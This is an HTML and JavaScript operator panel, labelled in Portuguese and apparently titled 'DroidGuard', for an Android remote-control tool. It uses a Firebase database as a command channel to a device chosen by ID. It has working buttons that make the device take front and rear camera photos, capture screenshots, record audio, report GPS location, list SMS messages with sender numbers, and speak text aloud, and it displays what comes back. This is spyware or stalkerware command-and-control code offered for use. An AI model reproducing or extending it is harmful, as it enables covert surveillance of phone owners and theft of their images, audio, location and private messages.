<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DroidGuard - Painel</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0c0f; font-family: 'Segoe UI', sans-serif; color: #eef2ff; padding: 20px; }
        .card { background: #0f1219; border-radius: 16px; padding: 20px; margin-bottom: 20px; border: 1px solid #1e2a36; }
        button { background: #2f8e8b; border: none; padding: 12px 20px; margin: 8px; border-radius: 8px; color: white; cursor: pointer; }
        button:hover { background: #3fa39f; transform: scale(1.02); }
        input, select { background: #1e2a36; border: none; padding: 10px; border-radius: 8px; color: white; margin: 5px; }
        .online { color: #2ecc71; }
        .result-img { max-width: 100%; border-radius: 8px; margin-top: 10px; border: 2px solid #2f8e8b; }
        audio { width: 100%; margin-top: 10px; }
        pre { background: #1a1f2a; padding: 15px; border-radius: 8px; overflow: auto; max-height: 300px; }
        .bateria { font-size: 24px; font-weight: bold; color: #2ecc71; }
        iframe { width: 100%; border-radius: 8px; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>🛡️ DroidGuard</h1>
    
    <div class="card">
        <h3>📱 Conectar ao Dispositivo</h3>
        <input type="text" id="deviceIdInput" placeholder="Digite o ID do dispositivo" style="width: 60%;">
        <button onclick="conectar()">🔗 CONECTAR</button>
        <div id="statusConexao"></div>
    </div>

    <div id="controles" style="display:none;">
        <div class="card">
            <h3>📸 Comandos</h3>
            <button onclick="enviarComando('bateria')">🔋 Bateria</button>
            <button onclick="enviarComando('vibrar')">📳 Vibrar</button>
            <button onclick="enviarComando('gps')">📍 GPS</button>
            <button onclick="enviarComando('foto_frontal')">📷 Foto Frontal</button>
            <button onclick="enviarComando('foto_traseria')">📷 Foto Traseira</button>
            <button onclick="enviarComando('screenshot')">📸 Screenshot</button>
            <button onclick="enviarComando('gravar_audio', {duracao:5})">🎤 Áudio 5s</button>
            <button onclick="enviarComando('listar_sms')">📨 SMS</button>
            <button onclick="abrirFalar()">🗣️ Falar</button>
        </div>

        <div class="card">
            <h3>📋 RESULTADO</h3>
            <div id="resultadoArea">Aguardando comandos...</div>
        </div>
    </div>

    <div id="modalFalar" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#1a1f2a; padding:30px; border-radius:16px; z-index:1000;">
        <h3>🗣️ Falar no Dispositivo</h3>
        <input type="text" id="textoFalar" style="width:100%; margin:10px 0; padding:10px;">
        <button onclick="enviarComando('falar', {texto: document.getElementById('textoFalar').value}); fecharFalar()">Enviar</button>
        <button onclick="fecharFalar()">Cancelar</button>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://droidguard-10597-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        let dispositivoAtual = null;
        
        function conectar() {
            const id = document.getElementById('deviceIdInput').value.trim();
            if(!id) {
                alert('Digite o ID do dispositivo!');
                return;
            }
            
            dispositivoAtual = id;
            document.getElementById('statusConexao').innerHTML = `<span class="online">✅ Conectado a: ${dispositivoAtual}</span>`;
            document.getElementById('controles').style.display = 'block';
            
            // Verificar se o dispositivo existe
            db.ref(`dispositivos/${dispositivoAtual}`).on('value', (snap) => {
                const d = snap.val();
                if(d && d.status === 'online') {
                    document.getElementById('statusConexao').innerHTML = `<span class="online">✅ Conectado a: ${dispositivoAtual} | 🔋 Bateria: ${d.bateria || '?'}%</span>`;
                }
            });
        }
        
        async function enviarComando(acao, params = {}) {
            if(!dispositivoAtual) {
                alert('Conecte a um dispositivo primeiro!');
                return;
            }
            
            const cmdId = Date.now().toString();
            document.getElementById('resultadoArea').innerHTML = `🔄 Enviando ${acao}... Aguardando resposta...`;
            
            try {
                await db.ref(`comandos/${dispositivoAtual}/${cmdId}`).set({ 
                    acao: acao, 
                    params: params, 
                    timestamp: Date.now() 
                });
                
                const resultRef = db.ref(`resultados/${dispositivoAtual}/${cmdId}`);
                resultRef.once('value', (snap) => {
                    const res = snap.val();
                    
                    if(res) {
                        if(res.foto) {
                            document.getElementById('resultadoArea').innerHTML = `
                                <img src="data:image/jpeg;base64,${res.foto}" class="result-img">
                                <p>📸 Foto recebida!</p>
                            `;
                        }
                        else if(res.screen) {
                            document.getElementById('resultadoArea').innerHTML = `
                                <img src="data:image/png;base64,${res.screen}" class="result-img">
                                <p>📱 Screenshot recebido!</p>
                            `;
                        }
                        else if(res.audio) {
                            document.getElementById('resultadoArea').innerHTML = `
                                <audio controls src="data:audio/aac;base64,${res.audio}"></audio>
                                <p>🎤 Áudio recebido!</p>
                            `;
                        }
                        else if(res.latitude) {
                            document.getElementById('resultadoArea').innerHTML = `
                                <p>📍 Latitude: ${res.latitude}</p>
                                <p>📍 Longitude: ${res.longitude}</p>
                                <iframe width="100%" height="300" frameborder="0" 
                                    src="https://maps.google.com/maps?q=${res.latitude},${res.longitude}&output=embed"></iframe>
                            `;
                        }
                        else if(res.sms) {
                            let html = '<h4>📨 Últimos SMS:</h4>';
                            res.sms.forEach(s => {
                                html += `<p><strong>${s.numero}</strong><br>${s.texto}</p><hr>`;
                            });
                            document.getElementById('resultadoArea').innerHTML = html;
                        }
                        else if(res.percentage !== undefined) {
                            document.getElementById('resultadoArea').innerHTML = `<div class="bateria">🔋 Bateria: ${res.percentage}%</div>`;
                        }
                        else {
                            document.getElementById('resultadoArea').innerHTML = `<pre>${JSON.stringify(res, null, 2)}</pre>`;
                        }
                    } else {
                        document.getElementById('resultadoArea').innerHTML = '⏳ Nenhuma resposta recebida...';
                    }
                });
                
                setTimeout(() => resultRef.off(), 20000);
                
            } catch(e) {
                document.getElementById('resultadoArea').innerHTML = `❌ Erro: ${e.message}`;
            }
        }
        
        function abrirFalar() { document.getElementById('modalFalar').style.display = 'block'; }
        function fecharFalar() { document.getElementById('modalFalar').style.display = 'none'; }
    </script>
</body>
</html>
